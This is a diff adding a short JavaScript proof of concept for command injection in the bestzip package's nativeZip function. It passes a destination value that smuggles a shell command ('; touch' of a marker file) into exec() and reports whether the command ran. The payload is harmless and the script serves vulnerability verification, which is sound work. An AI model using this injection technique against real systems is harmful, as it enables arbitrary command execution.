@@ -1,0 +1,32 @@
+```javascript
+// Exploit for bestzip command injection (nativeZip / zipProcess sink).
+// nativeZip() builds a shell command by directly concatenating the
+// user-supplied "destination" and "source" strings and runs it with
+// child_process.exec(), so shell metacharacters in either field let an
+// attacker execute arbitrary commands.
+
+const bestzip = require("./node_modules/bestzip");
+const fs = require("fs");
+const os = require("os");
+const path = require("path");
+
+const marker = path.join(os.tmpdir(), "pwned_" + Date.now());
+
+// Malicious "destination" containing a shell command injection payload.
+const maliciousDestination = `out.zip; touch ${marker} #`;
+
+bestzip
+  .nativeZip({
+    source: "package.json",
+    destination: maliciousDestination,
+  })
+  .then(() => console.log("zip finished"))
+  .catch((err) => console.log("zip errored (command still ran):", err.message))
+  .finally(() => {
+    if (fs.existsSync(marker)) {
+      console.log("VULNERABLE: injected command executed ->", marker);
+    } else {
+      console.log("marker file not found; injection did not run");
+    }
+  });
+```
